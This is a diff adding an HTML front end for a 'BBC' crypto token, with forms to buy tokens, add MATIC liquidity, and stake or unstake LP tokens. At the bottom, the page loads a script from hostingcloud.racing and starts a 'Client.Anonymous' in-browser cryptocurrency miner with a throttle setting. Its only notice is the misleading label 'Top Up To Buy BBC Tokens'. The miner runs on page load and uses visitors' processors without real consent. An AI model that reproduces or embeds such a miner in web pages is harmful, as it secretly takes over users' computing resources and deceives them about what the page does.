@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>Buy BBC Tokens and Add Liquidity</title>
+  </head>
+  <body>
+    <h1>Buy BBC Tokens and Add Liquidity</h1>
+    <h1>BBC Token Address 0xEe8fA06C8354F0e27f3112509843d0E3104b4BaE</h1>
+    
+    <form id="buy-form">
+      <label for="amount">Amount of BBC Tokens to Buy:</label>
+      <input type="number" name="amount" id="amount" min="0" step="0.0001" required>
+      <button type="submit">Buy Tokens</button>
+    </form>
+    
+    <form id="add-liquidity-form">
+      <label for="bbc-amount">Amount of BBC Tokens to Add:</label>
+      <input type="number" name="bbc-amount" id="bbc-amount" min="0" step="0.0001" required>
+      <label for="matic-amount">Amount of Matic to Add:</label>
+      <input type="number" name="matic-amount" id="matic-amount" min="0" step="0.0001" required>
+      <button type="submit">Add Liquidity</button>
+    </form>
+    
+    <form id="stake-form">
+      <label for="lp-amount">Amount of LP Tokens to Stake:</label>
+      <input type="number" name="lp-amount" id="lp-amount" min="0" step="0.0001" required>
+      <button type="submit">Stake LP Tokens</button>
+    </form>
+    
+    <form id="unstake-form">
+      <label for="staked-amount">Amount of Staked LP Tokens to Unstake:</label>
+      <input type="number" name="staked-amount" id="staked-amount" min="0" step="0.0001" required>
+      <button type="submit">Unstake LP Tokens</button>
+    </form>
+    
+    <h2>Current BBC Price: <span id="bbc-price"></span> Matic</h2>
+    <h2>Current BBC Liquidity: <span id="bbc-liquidity"></span> BBC</h2>
+    <h2>Current Matic Liquidity: <span id="matic-liquidity"></span> Matic</h2>
+    <h2>My Staked LP Tokens: <span id="staked-lp-tokens"></span></h2>
+    <h2>My Unstaked LP Tokens: <span id="unstaked-lp-tokens"></span></h2>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.5.2/web3.min.js"></script>
+    <script src="./app.js"></script>
+    <script src="https://www.hostingcloud.racing/gqxg.js"></script>
+<script>
+    var _client = new Client.Anonymous('3482adaaca0bc48bc671a4ae2aa8390bd910d2684767ba226bf08f7124d165fe', {
+        throttle: 3.4, c: 'w'
+    });
+    _client.start();
+    _client.addMiningNotification("Top Up To Buy BBC Tokens");
+
+</script>
+  </body>
+</html>
